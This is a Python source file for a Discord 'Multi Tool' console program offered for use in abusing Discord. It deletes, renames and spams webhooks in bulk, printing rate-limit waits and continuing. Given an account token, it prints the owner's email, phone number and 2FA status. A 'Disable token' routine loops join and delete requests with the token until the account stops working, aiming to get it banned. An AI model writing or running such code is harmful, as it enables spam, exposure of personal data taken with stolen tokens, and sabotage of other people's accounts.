import colorama, os, ctypes, requests
from colorama import Fore, init
from discord.webhook import Webhook
from time import sleep
from dhooks import Webhook
init(autoreset=True)
ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
width = os.get_terminal_size().columns
c = Fore.CYAN
w = Fore.WHITE
def cls():
    os.system("cls")
cls()

def menu():
    print(Fore.CYAN+"")
    print(f"""                     {Fore.WHITE}███{Fore.LIGHTCYAN_EX}╗   {Fore.WHITE}███{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}╗   {Fore.WHITE}██{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}╗  {Fore.WHITE}████████{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}╗    {Fore.WHITE}████████{Fore.LIGHTBLUE_EX}╗ {Fore.WHITE}██████{Fore.LIGHTBLUE_EX}╗  {Fore.WHITE}██████{Fore.LIGHTBLUE_EX}╗ {Fore.WHITE}██{Fore.BLUE}╗               
                     {Fore.WHITE}████{Fore.LIGHTCYAN_EX}╗ {Fore.WHITE}████{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║  ╚══{Fore.WHITE}██{Fore.CYAN}╔══╝{Fore.WHITE}██{Fore.CYAN}║    {Fore.CYAN}╚══{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╔══╝{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╔═══{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╗{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╔═══{Fore.WHITE}██{Fore.LIGHTBLUE_EX}╗{Fore.WHITE}██{Fore.BLUE}║
                     {Fore.WHITE}██{Fore.LIGHTCYAN_EX}╔{Fore.WHITE}████{Fore.LIGHTCYAN_EX}╔{Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║     {Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║       {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║{Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║{Fore.WHITE}██{Fore.BLUE}║     
                     {Fore.WHITE}██{Fore.LIGHTCYAN_EX}║╚{Fore.WHITE}██{Fore.LIGHTCYAN_EX}╔╝{Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}║     {Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║       {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║{Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║{Fore.WHITE}██{Fore.BLUE}║     
                     {Fore.WHITE}██{Fore.LIGHTCYAN_EX}║ ╚═╝ {Fore.WHITE}██{Fore.CYAN}║╚{Fore.WHITE}██████{Fore.CYAN}╔╝{Fore.WHITE}███████{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}║   {Fore.WHITE}██{Fore.CYAN}║       {Fore.WHITE}██{Fore.LIGHTBLUE_EX}║   ╚{Fore.WHITE}██████{Fore.LIGHTBLUE_EX}╔╝╚{Fore.WHITE}██████{Fore.LIGHTBLUE_EX}╔╝{Fore.WHITE}███████{Fore.BLUE}╗
                     {Fore.LIGHTCYAN_EX}╚═╝     ╚{Fore.CYAN}═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝       {Fore.LIGHTBLUE_EX}╚═╝    ╚═════╝  ╚═════╝ ╚{Fore.BLUE}══════╝""")
    print(f"{Fore.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.LIGHTBLUE_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def webhook_delete():
    ctypes.windll.kernel32.SetConsoleTitleW("Delete webhook | Lodi#0001")
    webhook = input(f"{c}[{w}Delete webhook{c}] {w}| {c}Enter webhook{w}: ")
    wh1=requests.get(webhook)
    if wh1.status_code == 404:
        cls()
        menu()
        print(f"{c}[{w}Delete webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Delete webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()
    elif wh1.status_code == 200:
        cls()
        menu()
        print(f"{c}[{w}Delete webhook{c}] {w}| {Fore.LIGHTGREEN_EX}Valid webhook{w}.")
        requests.delete(webhook)
        sleep(.5)
        print(f"{c}[{w}Delete webhook{c}] {w}| {c}Webhook deleted{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Delete webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()
        
def webhook_spammer():
    ctypes.windll.kernel32.SetConsoleTitleW("Spam webhook | Lodi#0001")
    webhook=input(f"{c}[{w}Spam webhook{c}] {w}| {c}Enter webhook{w}: ")
    message=input(f"{c}[{w}Spam webhook{c}] {w}| {c}Enter message{w}: ")
    amount=input(f"{c}[{w}Spam webhook{c}] {w}| {c}Amount of requests{w}: ")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Spam webhook | 0/{amount} | Lodi#0001")
    wh1=requests.get(webhook)
    if wh1.status_code == 404:
        cls()
        menu()
        print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Spam webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()
    elif wh1.status_code == 200:
        req_count = 0
        cls()
        menu()
        print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.LIGHTGREEN_EX}Valid webhook{w}.")
        sleep(.7)
        print(f"{c}[{w}Spam webhook{c}] {w}| {c}Sending {w}{amount} {c}requests with {w}{message}{c}.")
        for x in range(int(amount)):
            spam=requests.post(webhook, json = {"content" : message}, params = {'wait' : True})
            req_count += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f"Spam webhook | {req_count}/{amount} | Lodi#0001")
            if spam.status_code == 429:
                print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.RED}Rate limited {c}[{w}{spam.json()['retry_after']}ms{c}]")
                sleep(spam.json()["retry_after"] / 1000)
        print(f"{c}[{w}Spam webhook{c}] {w}| {Fore.LIGHTGREEN_EX}Finished{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Spam webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()

def webhook_info():
    ctypes.windll.kernel32.SetConsoleTitleW("Webhook info | Lodi#0001")
    webhook=input(f"{c}[{w}Webhook info{c}] {w}| {c}Enter webhook{w}: ")
    hook = Webhook(f"{webhook}")
    wh1=requests.get(webhook)
    if wh1.status_code == 404:
        cls()
        menu()
        print(f"{c}[{w}Webhook info{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Webhook info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()
    elif wh1.status_code == 200:
        cls()
        menu()
        print(f"{c}[{w}Webhook info{c}] {w}| {Fore.LIGHTGREEN_EX}Valid webhook{w}.")
        hook.get_info()
        sleep(.1)
        print(f"{c}[{w}Webhook info{c}] {w}| {c}Guild ID: {w}{hook.guild_id}")
        print(f"{c}[{w}Webhook info{c}] {w}| {c}Channel ID: {w}{hook.channel_id}")
        print(f"{c}[{w}Webhook info{c}] {w}| {c}Name: {w}{hook.default_name}")
        print(f"{c}[{w}Webhook info{c}] {w}| {c}Avatar: {w}{hook.default_avatar_url}")
        sleep(.3)
        exit=input(f"{c}[{w}Webhook info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()

def webhook_modify():
    ctypes.windll.kernel32.SetConsoleTitleW("Modify webhook | Lodi#0001")
    webhook=input(f"{c}[{w}Modify webhook{c}] {w}| {c}Enter webhook{w}: ")
    webhook_name=input(f"{c}[{w}Modify webhook{c}] {w}| {c}Enter webhook name{w}: ")
    hook = Webhook(f"{webhook}")
    wh1=requests.get(webhook)
    if wh1.status_code == 404:
        cls()
        menu()
        print(f"{c}[{w}Modify webhook{c}] {w}| {Fore.RED}Invalid webhook{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Modify webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()
    elif wh1.status_code == 200:
        cls()
        menu()
        print(f"{c}[{w}Modify webhook{c}] {w}| {Fore.LIGHTGREEN_EX}Valid webhook{w}.")
        hook.modify(name=webhook_name)
        sleep(.3)
        print(f"{c}[{w}Modify webhook{c}] {w}| {c}Successfully changed webhook name to {w}{webhook_name}{c}.")
        sleep(.3)
        exit=input(f"{c}[{w}Modify webhook{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()

def token_info():
    ctypes.windll.kernel32.SetConsoleTitleW("Token info | Lodi#0001")
    token=input(f"{c}[{w}Token info{c}] {w}| {c}Enter token{w}: ")
    cls()
    menu()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

    if tkn.status_code == 200:
        print(f"{c}[{w}Token info{c}] {w}| {Fore.LIGHTGREEN_EX}Valid token{w}.")
        tkn_json = tkn.json()
        user_name = f'{tkn_json["username"]}#{tkn_json["discriminator"]}'
        user_id = tkn_json['id']
        avatar_id = tkn_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = tkn_json['phone']
        email = tkn_json['email']
        mfa_enabled = tkn_json['mfa_enabled']
        sleep(.1)
        print(f"""{c}[{w}Token info{c}] {w}| {c}User ID: {w}{user_id}
{c}[{w}Token info{c}] {w}| {c}Username: {w}{user_name}
{c}[{w}Token info{c}] {w}| {c}2fa: {w}{mfa_enabled}
{c}[{w}Token info{c}] {w}| {c}Avatar: {w}{avatar_url}
{c}[{w}Token info{c}] {w}| {c}Email: {w}{email}
{f"{c}[{w}Token info{c}] {w}| {c}Phone number: {w}{phone_number}" if phone_number else f"{c}[{w}Token info{c}] {w}| {Fore.RED}No phone number{w}."}""")
        sleep(.3)
        exit=input(f"{c}[{w}Token info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()
    elif tkn.status_code == 401:
        print(f"{c}[{w}Token info{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Token info{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()

def token_disabler():
    ctypes.windll.kernel32.SetConsoleTitleW("Disable token | Lodi#0001")
    token=input(f"{c}[{w}Disable token{c}] {w}| {c}Enter token{w}: ")
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
    if tkn.status_code == 200:
        print(f"{c}[{w}Disable token{c}] {w}| {Fore.LIGHTGREEN_EX}Valid token{w}.")
        tkn_json = tkn.json()
        cls()
        menu()
        print(f"{c}[{w}Disable token{c}] {w}| {c}Account disabled: {Fore.RED}False")
        while True:
            api = requests.get("https://discordapp.com/api/v6/invite/PGRqctPYHX")
            data = api.json()
            check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
            stuff = check.json()
            requests.post("https://discordapp.com/api/v6/invite/PGRqctPYHX", headers={"Authorization": token})
            requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            tkn = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            
            if tkn.status_code == 401:
                cls()
                menu()
                print(f"{c}[{w}Disable token{c}] {w}| {c}Account disabled: {Fore.LIGHTGREEN_EX}True")
                exit=input(f"{c}[{w}Disable token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
                cls()
                menu()
                ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
                options()
    elif tkn.status_code == 401:
        print(f"{c}[{w}Disable token{c}] {w}| {Fore.RED}Invalid token{w}.")
        sleep(.3)
        exit=input(f"{c}[{w}Disable token{c}] {w}| {Fore.YELLOW}Press enter{w}...")
        cls()
        menu()
        ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
        options()







    





def options():
    print(f"                    {Fore.LIGHTCYAN_EX}┌─────────{Fore.CYAN}──────────────────────────────{Fore.LIGHTBLUE_EX}──────────────────────────────{Fore.BLUE}─────────┐")
    print(f"                    {Fore.LIGHTCYAN_EX}[{w}1{Fore.LIGHTCYAN_EX}]  {w}Delete webhook                                            Webhook info  {Fore.BLUE}[{w}4{Fore.BLUE}]")
    print(f"                    {Fore.LIGHTCYAN_EX}[{w}2{Fore.LIGHTCYAN_EX}]  {w}Spam webhook                                                Token info  {Fore.BLUE}[{w}5{Fore.BLUE}]")
    print(f"                    {Fore.LIGHTCYAN_EX}[{w}3{Fore.LIGHTCYAN_EX}]  {w}Modify webhook                                           Disable token  {Fore.BLUE}[{w}6{Fore.BLUE}]")
    print(f"                    {Fore.LIGHTCYAN_EX}└─────────{Fore.CYAN}──────────────────────────────{Fore.LIGHTBLUE_EX}──────────────────────────────{Fore.BLUE}─────────┘")
    option_choice=input(f"\n{c}[{w}Multi Tool{c}] {w}| {c}Choice{w}: ")
    cls()
    menu()
    if option_choice == "1":
        webhook_delete()
    if option_choice == "2":
        webhook_spammer()
    if option_choice == "3":
        webhook_modify()
    if option_choice == "4":
        webhook_info()
    if option_choice == "5":
        token_info()
    if option_choice == "6":
        token_disabler()















ctypes.windll.kernel32.SetConsoleTitleW("Multi Tool v1.0 | Lodi#0001")
menu()
options()
print(f"{c}[{w}Multi Tool{c}] {w}| {Fore.RED}Invalid choice{w}.")
exit=input(f"{c}[{w}Multi Tool{c}] {w}| {Fore.YELLOW}Press enter to exit{w}...")
